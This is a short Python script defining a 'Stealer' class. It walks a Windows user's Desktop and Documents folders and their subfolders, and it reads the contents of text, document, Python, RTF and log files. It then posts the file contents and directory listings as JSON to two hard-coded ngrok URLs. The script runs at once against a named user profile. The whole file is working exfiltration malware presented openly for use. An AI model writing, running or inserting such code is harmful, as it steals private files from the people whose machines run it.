import os
import requests as r
from Errors import Error


class Stealer:

    def __init__(self, data: list, podkatalog=False, all_disk_files=False, adres=""):
        self.data_saves = {}
        self.data = data
        self.podkatalog = podkatalog 
        self.all_disk_files = all_disk_files
        if self.all_disk_files and self.podkatalog:
            raise Error("podkatalog and all disk is True")
        self.adres = adres

    def generate_data(self):
        for i in self.data:
            try:
                dts = os.listdir(i)
                self.data_saves[f"{i}"] = []
                for j in dts:
                    try:
                        if j.endswith('.txt') or j.endswith('.docs') or j.endswith('.text') or j.endswith('.doc') or j.endswith('.py') or j.endswith('.rtf') or j.endswith('.log'):
                            self.data_saves[f"{i}"].append(j)
                    except:
                        continue
            except PermissionError:
                continue

        return self.data_saves

    def get_file_names(self):
        self.files = {}
        for i in self.data:
            try:
                tmp = os.listdir(i)
                self.files[f"{i}"] = tmp
            except:
                continue
        return self.files

    def read_podktg(self):
        if self.podkatalog:
            new_data = []
            for i in self.data:
                tmp = os.listdir(i)
                for j in tmp:
                    if os.path.isdir(f"{i}\{j}"):
                        new_data.append(f"{i}\{j}")
            self.data.extend(new_data)
            
    def read_disk(self):
        """if self.all_disk_files:
            new_data=[]
            way=""
            for i in self.data:
                way=i
                while os.path.isdir(way):
                    tmp=os.listdir(way)
                    for j in tmp:
                        if os.path.isdir(j):
                            way=f"{i}\{j}"
                            new_data.append(way)
            return new_data"""
        
            
            
    def stel(self):
        hard_slv = {}
        for i in self.data_saves:
            hard_slv[f"{i}"] = {}
            for j in self.data_saves[i]:
                hard_slv[f"{i}"][f"{j}"] = []
                try:
                    with open(f"{i}\{j}", "r", encoding="UTF-8") as f:
                        tmp = f.read()
                    hard_slv[f"{i}"][f"{j}"].append(tmp)
                except (UnicodeDecodeError, PermissionError):
                    continue
        return hard_slv

    def otpravka(self, data,data2,adr):
        r.post(self.adres, json=data)
        r.post(adr,json=data2)


a="https://4b3c-80-246-94-150.ngrok-free.app/gfshjoifhugih/iidshfidhdfioidd/rrr345u8939f5876438dw/fcwef123"
b="https://4421-80-246-94-150.ngrok-free.app/gfshjoifhugih/iidshfidhdfioidd/rrr345u8939f5876438dw/fcwef123/qaz"
s = Stealer(["C:\\Users\\IKYOP\\Desktop","C:\\Users\\IKYOP\\Documents"], True,adres=a)

s.read_podktg()
s.generate_data()

s.otpravka(s.stel(),s.get_file_names(),adr=b)

